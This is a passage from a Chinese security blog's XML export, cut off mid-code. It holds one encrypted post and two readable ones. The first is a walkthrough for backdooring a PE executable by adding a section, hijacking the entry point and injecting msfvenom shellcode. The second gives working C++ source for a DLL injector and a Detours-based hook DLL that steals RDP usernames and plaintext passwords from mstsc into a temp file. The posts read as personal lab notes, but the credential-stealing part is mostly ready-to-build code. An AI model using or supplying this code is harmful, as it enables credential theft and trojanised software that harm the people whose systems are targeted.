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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
        <tags>
            
            <tag> htb </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>PE注入</title>
      <link href="/posts/76f3e4e2.html"/>
      <url>/posts/76f3e4e2.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>早上在先知社区看见一篇手动PE注入的文章。看起来挺感兴趣，研究了一下<br><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1576669956890&amp;di=e9cbb8db1d6e158ce9582ac2ed35968c&amp;imgtype=0&amp;src=http%3A%2F%2Fi0.hdslb.com%2Fbfs%2Farticle%2Ff5e33db662e3f26526b0b1c234c55512534dac28.jpg" alt="timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1576669956890&amp;di=e9cbb8db1d6e158ce9582ac2ed35968c&amp;imgtype=0&amp;src=http%3A%2F%2Fi0.hdslb.com%2Fbfs%2Farticle%2Ff5e33db662e3f26526b0b1c234c55512534dac28.jpg"></p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><pre><code>OS:windows 7工具:LordPEODHxDPESecurity-master https://github.com/NetSPI/PESecurity</code></pre><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p>首先实验PEsecurity检查是否有ASLR</p><blockquote><p>ASLR（Address space layout randomization）是一种针对缓冲区溢出的安全保护技术，通过对堆、栈、共享库映射等线性区布局的随机化，通过增加攻击者预测目的地址的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的</p></blockquote><p><img src="https://s2.ax1x.com/2019/12/18/Q7OXFg.png" alt="Q7OXFg.png"></p><p>无ASLR，那么使用LordPE打开，并新建一个区段<br><img src="https://s2.ax1x.com/2019/12/18/Q7Xgcn.md.png" alt="Q7Xgcn.md.png"></p><p><img src="https://s2.ax1x.com/2019/12/18/Q7jK3j.md.png" alt="Q7jK3j.md.png"></p><p>由于新加了一个区段，EXE现在无法打开，使用HxD插入1000个00（就是虚拟大小）<br><img src="https://s2.ax1x.com/2019/12/18/Q7vpZV.png" alt="Q7vpZV.png"></p><p>测试能否正常打开<br><img src="https://s2.ax1x.com/2019/12/18/Q7vfFU.png" alt="Q7vfFU.png"></p><p>OD打开找到添加的区段<br><img src="https://s2.ax1x.com/2019/12/18/Q7vbex.png" alt="Q7vbex.png"></p><p>将入口点改为</p><pre><code>jmp 00412000</code></pre><p><img src="https://s2.ax1x.com/2019/12/18/Q7xQ00.png" alt="Q7xQ00.png"></p><p>之后单独保存为一个exe，然后在打开右键跟随jmp就可以去到定义的空白区段了<br><img src="https://s2.ax1x.com/2019/12/18/Q7x2jA.png" alt="Q7x2jA.png"></p><p>msfvenom生成一个弹Messagebox的shellcode（32位）</p><pre><code>msfvenom -p windows/messagebox text=&quot;it&#39;s demo&quot; -f hex</code></pre><p>（懒得在生成一遍）<br><img src="https://s2.ax1x.com/2019/12/18/Q7xxEV.png" alt="Q7xxEV.png"><br>复制生成的shellcode，然后在空白区段选中大部分，二进制-&gt;二进制粘贴<br><img src="https://s2.ax1x.com/2019/12/18/Q7zEHx.png" alt="Q7zEHx.png"></p><p>之后在保存执行即可看见效果<br><img src="https://s2.ax1x.com/2019/12/18/Q7zK8e.png" alt="Q7zK8e.png"></p><p>恢复程序正常执行，既然执行了我们要的玩意那么就要恢复原来的程序正常执行<br>PS：生成什么反弹meterpreter和执行命令的shellcode，之后之后貌似无法还原。。。一堆几把问题。弄了一下午</p><p>先打开未被修改过的exe在和修改过的exe对比入口点<br><img src="https://s2.ax1x.com/2019/12/18/Q7z6aV.png" alt="Q7z6aV.png"></p><p>执行完上面的之后可以看到进入了下一个区段，把区段的地址拿出来</p><pre><code>00405331  |.  68 A0614000   push Hash.004061A0</code></pre><p>最后得出要修改的</p><pre><code>push ebpmov ebp,esppush -0x1jmp 00405331-------------------------------------------------00412103    90              nop00412104    9D              popfd //恢复堆栈00412105    61              popad //恢复堆栈00412106    55              push ebp00412107    8BEC            mov ebp,esp00412109    6A FF           push -0x10041210B  - E9 2132FFFF     jmp Hash7.00405331 //跳转到下一个区段00405331</code></pre><p>找到shellcode最后的call然后替换为上面的<br>（修改前）<br><img src="https://s2.ax1x.com/2019/12/18/Q7zqPO.png" alt="Q7zqPO.png"></p><p>（修改后）<br><img src="https://s2.ax1x.com/2019/12/18/QHSZss.png" alt="QHSZss.png"></p><p>在另存为一个单独的exe，效果如下<br><img src="https://s2.ax1x.com/2019/12/18/QHSTyj.gif" alt="QHSTyj.md.gif"></p><p>执行calc的<br><img src="https://s2.ax1x.com/2019/12/18/QHpVfO.gif" alt="QHpVfO.md.gif"></p><p>为了把calc弄的和上面可以正常返回，开始了折腾数小时的操作…..</p><ul><li>popfd和popad不行 X</li><li>堆栈平衡，calc好像弹不出 X</li></ul><p>堆栈平衡：shellcode之前的ESP-shellcode执行之后的ESP=差值<br><img src="https://s2.ax1x.com/2019/12/18/QH9S4f.png" alt="QH9S4f.png"></p><p><img src="https://s2.ax1x.com/2019/12/18/QH94MQ.md.png" alt="QH94MQ.md.png"></p><p>尝试F8到calc弹出之后在返回 X<br><img src="https://s2.ax1x.com/2019/12/18/QHCAzD.md.png" alt="QHCAzD.md.png"></p><p><img src="https://s2.ax1x.com/2019/12/18/QHClJf.gif" alt="QHClJf.md.gif"></p><p>尝试和原文反弹nc和meterpreter的，可以是可以。问题和上面如上，不过nc反弹的话海星<br><img src="https://s2.ax1x.com/2019/12/18/QHPMnJ.md.png" alt="QHPMnJ.md.png"></p><p><img src="https://s2.ax1x.com/2019/12/18/QHPGh6.png" alt="QHPGh6.png"></p><p>后面十分纠结…问了某dalao说是shellcode的问题</p><p>由于本人太垃圾没有找到解决的方法，待定…..</p><p>自动化的工具使用：<br>[kali linux捆绑工具shellter的安装及使用(<a href="https://blog.csdn.net/qq_34444097/article/details/79573798" target="_blank" rel="noopener">https://blog.csdn.net/qq_34444097/article/details/79573798</a>)</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://haiderm.com/fully-undetectable-backdooring-pe-file/" target="_blank" rel="noopener">Fully undetectable backdooring PE file</a><br><a href="https://xz.aliyun.com/t/6939#toc-4" target="_blank" rel="noopener">手工shellcode注入PE文件 - 先知社区</a><br><a href="https://bbs.pediy.com/thread-247370.htm" target="_blank" rel="noopener">[原创]使用“PE文件加区段工具”、“LordPE”、“WinHex”、“OllyDbg”为PE文件添加section、dll（API）-『软件逆向』-看雪安全论坛</a><br><a href="http://4hou.win/wordpress/?cat=5644" target="_blank" rel="noopener">PE文件 – backup</a></p>]]></content>
      
      
        <tags>
            
            <tag> 后门 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>从远程桌面客户端提取明文凭据</title>
      <link href="/posts/1e08ed31.html"/>
      <url>/posts/1e08ed31.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前段时间看到hook mstsc的，自己搞了几天。我也服了我自己….</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><pre><code>vs2015detours库win7</code></pre><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p>简单测试(HOOK了MessageBox)</p><pre><code class="cpp">#include &lt;Windows.h&gt;#include &lt;detours.h&gt; //加载detours库#pragma comment (lib,&quot;detours.lib&quot;)static int(WINAPI *TrueMessageBox)(HWND, LPCTSTR, LPCTSTR, UINT) = MessageBox; //根据函数原型来定义要被HOOk的函数（MSDN函数怎么写的你就怎么定义）int WINAPI OurMessageBox(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType) { //成功HOOK后的处理函数    return TrueMessageBox(NULL, L&quot;Hooked&quot;, lpCaption, 0); //HOOK成功弹个框}int main(){    DetourTransactionBegin(); //HOOK初始化    DetourUpdateThread(GetCurrentThread()); //刷新本身线程    DetourAttach(&amp;(PVOID&amp;)TrueMessageBox, OurMessageBox);  //加载要HOOK的函数    DetourTransactionCommit(); //开始HOOK    MessageBox(NULL, L&quot;Hello&quot;, L&quot;Hello&quot;, 0);    DetourTransactionBegin(); //HOOK初始化    DetourUpdateThread(GetCurrentThread()); //刷新本身线程    DetourDetach(&amp;(PVOID&amp;)TrueMessageBox, OurMessageBox);  //取消HOOK    DetourTransactionCommit(); //取消HOOK开始}</code></pre><p>如果HOOK成功的话，将如下图<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g9xjwlnx5uj311r0hsjsp.jpg" alt="006LG7Nygy1g9xjwlnx5uj311r0hsjsp.jpg"></p><p>之后编译原作者写好的,之后注入到mstsc<br>常规的DLL注入</p><pre><code class="cpp">#include &quot;stdafx.h&quot;#include &lt;Windows.h&gt;int main(int argc, char *argv[]) {    HANDLE processHandle;    PVOID remoteBuffer;    wchar_t dllPath[] = TEXT(&quot;H:\\C master\\dll\\ConsoleApplication1\\x64\\Release\\ConsoleApplication1.dll&quot;);    printf(&quot;Injecting DLL to PID: %i\n&quot;, atoi(argv[1]));    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);    WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL);    PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT(&quot;Kernel32&quot;)), &quot;LoadLibraryW&quot;);    CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL);    CloseHandle(processHandle);    return 0;}</code></pre><p>如果成功注入的话，会出现如下图<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g9xk11mc18j30pp0nl0x4.jpg" alt="006LG7Nygy1g9xk11mc18j30pp0nl0x4.jpg"></p><p>然后在temp目录下会有个data.bin，由于我是win7的原因API可能有些不同。记录不到IP<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g9xk25waluj30ei06ymx5.jpg" alt="006LG7Nygy1g9xk25waluj30ei06ymx5.jpg"></p><p>之后看到了三好学生的博客里的操作，使用API Monitor附加了mstsc.exe找到了记录用户名的API 函数<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g9xk5oly7qj31hc0qc10l.jpg" alt="006LG7Nygy1g9xk5oly7qj31hc0qc10l.jpg"></p><p>在根据MSDN文档里的CredReadW function定义方法，照搬定义即可<br><a href="https://docs.microsoft.com/zh-cn/windows/win32/api/wincred/nf-wincred-credreadw?view=vs-2017" target="_blank" rel="noopener">CredReadW function (wincred.h) - Win32 apps | Microsoft Docs</a></p><p>修改之后</p><pre><code class="cpp">// ConsoleApplication1.cpp : 定义 DLL 应用程序的导出函数。//#include &quot;stdafx.h&quot;#include &lt;Windows.h&gt;#include &quot;detours.h&quot;#include &lt;dpapi.h&gt;#include &lt;wincred.h&gt;#include &lt;strsafe.h&gt;#include &lt;subauth.h&gt;#define SECURITY_WIN32 #include &lt;sspi.h&gt;#pragma comment(lib,&quot;detours.lib&quot;)#pragma comment(lib, &quot;crypt32.lib&quot;)#pragma comment(lib, &quot;Advapi32.lib&quot;)#pragma comment(lib, &quot;Secur32.lib&quot;)LPCWSTR lpTempPassword = NULL;LPCWSTR lpUsername = NULL;LPCWSTR lpServer = NULL;VOID WriteCredentials() {    const DWORD cbBuffer = 1024;    TCHAR TempFolder[MAX_PATH];    GetEnvironmentVariable(L&quot;TEMP&quot;, TempFolder, MAX_PATH);    TCHAR Path[MAX_PATH];    StringCbPrintf(Path, MAX_PATH, L&quot;%s\\data.bin&quot;, TempFolder);    HANDLE hFile = CreateFile(Path, FILE_APPEND_DATA, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);    WCHAR  DataBuffer[cbBuffer];    memset(DataBuffer, 0x00, cbBuffer);    DWORD dwBytesWritten = 0;    StringCbPrintf(DataBuffer, cbBuffer, L&quot;Server: %s\nUsername: %s\nPassword: %s\n\n&quot;, lpServer, lpUsername, lpTempPassword);    WriteFile(hFile, DataBuffer, wcslen(DataBuffer) * 2, &amp;dwBytesWritten, NULL);    CloseHandle(hFile);}static BOOL(WINAPI *OriginalCredReadW)(LPCWSTR TargetName, DWORD Type, DWORD Flags, PCREDENTIALW *Credential) = CredReadW;BOOL HookedCredReadW(LPCWSTR TargetName, DWORD Type, DWORD Flags, PCREDENTIALW *Credential){    lpServer = TargetName;    return OriginalCredReadW(TargetName, Type, Flags, Credential);}static DPAPI_IMP BOOL(WINAPI * OriginalCryptProtectMemory)(LPVOID pDataIn, DWORD  cbDataIn, DWORD  dwFlags) = CryptProtectMemory;BOOL _CryptProtectMemory(LPVOID pDataIn, DWORD  cbDataIn, DWORD  dwFlags) {    DWORD cbPass = 0;    LPVOID lpPassword;    int *ptr = (int *)pDataIn;    LPVOID lpPasswordAddress = ptr + 0x1;    memcpy_s(&amp;cbPass, 4, pDataIn, 4);    //When the password is empty it only counts the NULL byte.    if (cbPass &gt; 0x2) {        SIZE_T written = 0;        lpPassword = VirtualAlloc(NULL, 1024, MEM_COMMIT, PAGE_READWRITE);        WriteProcessMemory(GetCurrentProcess(), lpPassword, lpPasswordAddress, cbPass, &amp;written);        lpTempPassword = (LPCWSTR)lpPassword;    }    return OriginalCryptProtectMemory(pDataIn, cbDataIn, dwFlags);}static BOOL(WINAPI * OriginalCredIsMarshaledCredentialW)(LPCWSTR 